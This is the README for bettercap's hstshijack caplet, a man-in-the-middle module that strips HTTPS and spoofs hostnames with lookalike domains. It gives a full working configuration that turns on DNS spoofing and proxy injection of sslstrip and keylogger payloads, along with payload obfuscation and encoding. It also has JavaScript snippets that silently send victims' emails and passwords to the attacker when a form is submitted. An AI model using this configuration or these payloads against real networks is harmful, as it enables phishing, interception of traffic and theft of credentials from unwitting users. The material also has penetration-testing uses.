<p align="center">
  <img width="420px" src="https://cdn.rawgit.com/yungtravla/cdn/ccdc3b8d/github.com/bettercap/caplets/hstshijack/logo.svg" />
</p>

### Caplet

```sh
set hstshijack.log             /usr/share/bettercap/caplets/hstshijack/ssl.log
set hstshijack.ignore          *
set hstshijack.targets         *.facebook.com, *.bing.com, www.*, *.com, *.net,*.org
set hstshijack.replacements    *.facebook.corn,*.bing.corn,wvvw.*,*.corn,*.nel,*.orq
#set hstshijack.blockscripts    facebook.com,*.facebook.com
set hstshijack.obfuscate       false
set hstshijack.encode          true
set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.js,google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.js

set http.proxy.script  /usr/share/bettercap/caplets/hstshijack/hstshijack.js
set dns.spoof.domains  wvvw.*,*.corn,*.nel,*.orq

http.proxy  on
dns.spoof   on
```

### Core payload

This module injects HTML & JS files with a payload that spoofs your targeted hostnames and communicates with bettercap, revealing all URLs that were discovered in the injected document.

When bettercap receives a callback with a new URL, it sends a HEAD request to learn whether the host in this URL sends HTTPS redirects, and keeps a log.

This is done so that bettercap can know whether it should MITM an SSL connection with a host, before the victim navigates to it.

### Inject payloads

You can also inject your own JavaScript payloads into HTML & JS files from specific hosts by assigning them to the `hstshijack.payloads` variable.

Example:

```sh
hstshijack.payloads *:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.js
```

Once the payload is injected into a page, you can technically phish any data unless the client navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.

<a href="./payloads/sslstrip.js">**sslstrip.js**</a> is included, which strips the `s` from all `https` instances in `<a>`, `<form>`, `<iframe>` and `<script>` elements.

### Obfuscation

By setting `hstshijack.obfuscate` to `true`, any instance in your payloads beginning with `obf_` will be obfuscated automatically. It's good practice to include unique prefixes/suffixes so that your variable names do not match those in other payloads.

Example:

```js
function obf_function_mySuffix() {
  alert("Random variable: obf_whatever_follows")
}

obf_function_mySuffix()
```

Will be injected as:

```js
function jfIleNwmKoa() {
  alert("Random variable: AsjZnJW")
}

jfIleNwmKoa()
```

### Encoding

Payloads can be injected in HTML documents using base64 encoded data URLs.

To enable payload encoding, set `hstshijack.encode` to `true`.

### Silent callbacks

You can write custom payloads that send data to bettercap without alerting the host.

Example of a silent callback:

```js
form.onsubmit = function() {
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.host + "/obf_path_callback?email=" + email + "&password=" + password)
  req.send()
}
```
<sup>Note: Every instance of `obf_path_callback` will be replaced with the callback path, every instance of `obf_path_whitelist` will be replaced with the whitelist path, and every instance of `obf_path_ssl_log` will be replaced with the SSL log path.</sup>

The code above will send a POST request that will be sniffed by bettercap, but not proxied. 

### Whitelisting callbacks

You can stop attacking a client on a certain host when you receive a request from that client for the whitelist path. The whitelist path will be inserted wherever you have `obf_path_whitelist` written in your payloads.

Example of whitelisting callbacks:

```js
// Whitelist multiple domains

form.onsubmit = function() {
  // Whitelist current hostname and phish credentials
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.hostname + "/obf_path_whitelist?email=" + email + "&password=" + password)
  req.send()

  // Whitelist facebook
  req = new XMLHttpRequest()
  req.open("POST", "http://facedook.com/obf_path_whitelist")
  req.send()

  // Whitelist facebook CDN
  req = new XMLHttpRequest()
  req.open("POST", "http://static.xx.fdcdn.net/obf_path_whitelist")
  req.send()

  // Whitelist redirect to facebook
  req = new XMLHttpRequest()
  req.open("POST", "http://fd.com/obf_path_whitelist")
  req.send()
}
```

When the bettercap proxy receives such a request, it will stop attacking clients on the requested (original and spoofed) host(s). If a spoofed location is requested that was whitelisted, the client will then be redirected to the intended location.

Note that if the hostnames you are whitelisting are HSTS preloaded, you have to send the whitelist callback to the spoofed hostnames, otherwise the browser will enforce a HTTPS connection, and bettercap will not be able to intercept the requests.

### Block scripts

In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript on hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 

### SSL log

If a host responds with a HTTPS redirect, the module saves this host in the SSL log, and bettercap will from then on spoof SSL connections with this host when possible.

### Hostname spoofing

In the <a href="./hstshijack.cap">**caplet file**</a> you can assign comma separated domains to the `hstshijack.targets` variable. _(wildcard allowed)_

For every hostname you assign to `hstshijack.targets` you must assign a replacement domain to the `hstshijack.replacements` variable.

Example:

```sh
set hstshijack.targets       www.*, *.com, blockchain.info,*.blockchain.info
set hstshijack.replacements  wvvw.*,*.corn,blockchian.info,*.blockchian.info
```

You can try to make them as unnoticeable or obvious as you like, but your options are limited here.
